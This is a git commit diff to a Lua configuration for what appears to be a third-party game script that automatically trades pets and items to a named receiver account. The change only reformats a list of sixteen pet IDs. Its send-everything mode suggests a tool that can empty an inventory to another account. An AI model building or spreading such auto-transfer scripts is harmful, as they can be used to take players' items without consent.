da9d8e65f5408e850f8e5cf9784f6b38a7f7afb3
lucivaantarez <151172065+lucivaantarez@users.noreply.github.com>
2026-07-11 03:59:39 +0700

    Update ahvdhj.lua

--- ahvdhj.lua
+++ ahvdhj.lua
@@ -17,24 +17,7 @@
             Usernames = {"Crystal0bKingN1381"}, -- Receivers to send to e.g. {"player1", "player2"} (also pickable in Trade tab)
             TradeMode = "specific", -- "all" = send everything in Categories | "specific" = only the Items list
             Categories = {"pets"}, -- What to send
-            Items = {
-            "admin_abuse_2025_sushi_penguin", 
-            "penguins_2025_dango_penguins",
-            "admin_abuse_egg_2026_robot_chicken", 
-            "food_pets_2026_dragonfruit_fox", 
-            "ice_dimension_2025_frostbite_bear", 
-            "journey_2026_pilot_gull", 
-            "journey_2026_sheepdog_duck", 
-            "endangered_2026_silverback_gorilla", 
-            "pet_recycler_2025_emberlight", 
-            "summer_2026_rainbow_trout", 
-            "icey_aura", 
-            "gifthat_2026_chocolate_chip_bat_dragon_backpack", 
-            "summer_2026_river_otter", 
-            "summer_2026_stygian_owl", 
-            "2d_tuesdays_2025_2d_kitty", 
-            "summer_2026_ruddy_duck",
-        }, -- Item IDs/names to send when TradeMode = "specific" e.g. {"dog", "cat", "buffalo"}
+            Items = {"admin_abuse_2025_sushi_penguin", "penguins_2025_dango_penguins", "admin_abuse_egg_2026_robot_chicken", "food_pets_2026_dragonfruit_fox", "ice_dimension_2025_frostbite_bear", "journey_2026_pilot_gull", "journey_2026_sheepdog_duck", "endangered_2026_silverback_gorilla", "pet_recycler_2025_emberlight", "summer_2026_rainbow_trout", "icey_aura", "gifthat_2026_chocolate_chip_bat_dragon_backpack", "summer_2026_river_otter", "summer_2026_stygian_owl", "2d_tuesdays_2025_2d_kitty", "summer_2026_ruddy_duck"}, -- Item IDs/names to send when TradeMode = "specific" e.g. {"dog", "cat", "buffalo"}
             ItemCounts = {}, -- Max per item per player e.g. {dog = 30, cat = 12} ({} = unlimited)
 
             -- GLOBAL pet filter. Used for ANY pet NOT listed in PetFilters below.
